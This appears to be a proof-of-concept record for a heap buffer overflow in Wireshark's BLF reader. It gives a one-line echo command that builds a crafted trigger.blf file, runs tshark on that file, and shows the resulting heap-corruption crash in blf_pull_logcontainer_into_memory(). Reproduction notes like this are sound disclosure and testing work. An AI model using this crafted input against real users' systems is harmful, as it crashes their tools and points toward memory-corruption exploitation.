# Wireshark BLF Reader Heap Buffer Overflow Vulnerability

## POC URL
This vulnerability was reported on GitLab: [Heap buffer overflow vulnerability in BLF reader (#19063)](https://gitlab.com/wireshark/wireshark/-/issues/19063)

## Compilation Environment
- Tested on: Ubuntu 22.04.2 LTS
- Wireshark version: Vulnerable versions (specific version not mentioned in report)

## Run Command
1. First, create the malicious BLF file:
```bash
echo -ne 'LOGG0...0000000000000000000000000000000000000000000000000000000000000000LOBJ............\x10\x00\x01\x00\x0f\x00\x00\x00\x0a\x00\x00\x00\x02\x000000000000000000000000000000000000000000000000' > trigger.blf
```

2. Then run tshark to trigger the vulnerability:
```bash
tshark -r trigger.blf
```

## Expected Output
The program should crash with an error message similar to:
```
malloc(): corrupted top size
Aborted
```

This indicates that a heap buffer overflow has occurred, corrupting memory and causing the program to abort. The vulnerability occurs when processing a maliciously crafted BLF file in the `blf_pull_logcontainer_into_memory()` function, where a memcpy operation copies more data than the allocated buffer can hold.
